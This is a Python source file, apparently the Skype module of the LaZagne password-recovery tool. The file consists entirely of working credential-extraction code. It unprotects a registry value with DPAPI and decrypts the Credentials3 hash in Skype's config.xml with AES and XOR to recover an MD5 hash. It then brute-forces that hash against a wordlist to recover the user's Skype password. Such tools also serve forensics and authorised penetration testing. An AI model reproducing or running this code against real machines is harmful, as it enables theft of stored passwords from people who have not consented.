# -*- coding: utf-8 -*-
import binascii
import hashlib
import os
import struct
from xml.etree.cElementTree import ElementTree

import lazagne.config.winstructure as win
from lazagne.config.constant import constant
from lazagne.config.crypto.pyaes.aes import AESModeOfOperationCBC
from lazagne.config.dico import get_dic
from lazagne.config.module_info import ModuleInfo

try: 
    import _winreg as winreg
except ImportError:
    import winreg


class Skype(ModuleInfo):
    def __init__(self):
        ModuleInfo.__init__(self, 'skype', 'chats', winapi_used=True)

        self.pwd_found = []

    def aes_encrypt(self, message, passphrase):
        iv = '\x00' * 16
        aes = AESModeOfOperationCBC(passphrase, iv=iv)
        return aes.encrypt(message)

    # get value used to build the salt
    def get_regkey(self):
        try:
            key_path = 'Software\\Skype\\ProtectedStorage'
            try:
                hkey = win.OpenKey(win.HKEY_CURRENT_USER, key_path)
            except Exception as e:
                self.debug(str(e))
                return False

            # num = winreg.QueryInfoKey(hkey)[1]
            k = winreg.EnumValue(hkey, 0)[1]
            result_bytes = win.Win32CryptUnprotectData(k, is_current_user=constant.is_current_user, user_dpapi=constant.user_dpapi)
            return result_bytes.decode("utf-8")
        except Exception as e:
            self.debug(str(e))
            return False

    # get hash from lazagne.configuration file
    def get_hash_credential(self, xml_file):
        tree = ElementTree(file=xml_file)
        encrypted_hash = tree.find('Lib/Account/Credentials3')
        if encrypted_hash is not None:
            return encrypted_hash.text
        else:
            return False

    # decrypt hash to get the md5 to bruteforce
    def get_md5_hash(self, enc_hex, key):
        # convert hash from hex to binary
        enc_binary = binascii.unhexlify(enc_hex)

        # retrieve the salt
        salt = hashlib.sha1('\x00\x00\x00\x00' + key).digest() + hashlib.sha1('\x00\x00\x00\x01' + key).digest()

        # encrypt value used with the XOR operation
        aes_key = self.aes_encrypt(struct.pack('I', 0) * 4, salt[0:32])[0:16]

        # XOR operation
        decrypted = []
        for d in range(16):
            decrypted.append(struct.unpack('B', enc_binary[d])[0] ^ struct.unpack('B', aes_key[d])[0])

        # cast the result byte
        tmp = ''
        for dec in decrypted:
            tmp = tmp + struct.pack(">I", dec).strip('\x00')

        # byte to hex
        return binascii.hexlify(tmp)

    def dictionary_attack(self, login, md5):
        wordlist = constant.password_found + get_dic()
        for word in wordlist:
            hash_ = hashlib.md5('%s\nskyper\n%s' % (login, word)).hexdigest()
            if hash_ == md5:
                return word
        return False

    def get_username(self, path):
        xml_file = os.path.join(path, u'shared.xml')
        if os.path.exists(xml_file):
            tree = ElementTree(file=xml_file)
            username = tree.find('Lib/Account/Default')
            try:
                return win.string_to_unicode(username.text)
            except Exception:
                pass
        return False

    def get_info(self, key, username, path):
        if os.path.exists(os.path.join(path, u'config.xml')):
            values = {}

            try:
                values['Login'] = username

                # get encrypted hash from the config file
                enc_hex = self.get_hash_credential(os.path.join(path, u'config.xml'))

                if not enc_hex:
                    self.warning(u'No credential stored on the config.xml file.')
                else:
                    # decrypt the hash to get the md5 to brue force
                    values['Hash'] = self.get_md5_hash(enc_hex, key)
                    values['Pattern to bruteforce using md5'] = win.string_to_unicode(values['Login']) + u'\\nskyper\\n<password>'

                    # Try a dictionary attack on the hash
                    password = self.dictionary_attack(values['Login'], values['Hash'])
                    if password:
                        values['Password'] = password

                    self.pwd_found.append(values)
            except Exception as e:
                self.debug(str(e))

    def run(self):
        path = os.path.join(constant.profile['APPDATA'], u'Skype')
        if os.path.exists(path):
            # retrieve the key used to build the salt
            key = self.get_regkey()
            if not key:
                self.error(u'The salt has not been retrieved')
            else:
                username = self.get_username(path)
                if username:
                    d = os.path.join(path, username)
                    if os.path.exists(d):
                        self.get_info(key, username, d)

                if not self.pwd_found:
                    for d in os.listdir(path):
                        self.get_info(key, d, os.path.join(path, d))

                return self.pwd_found
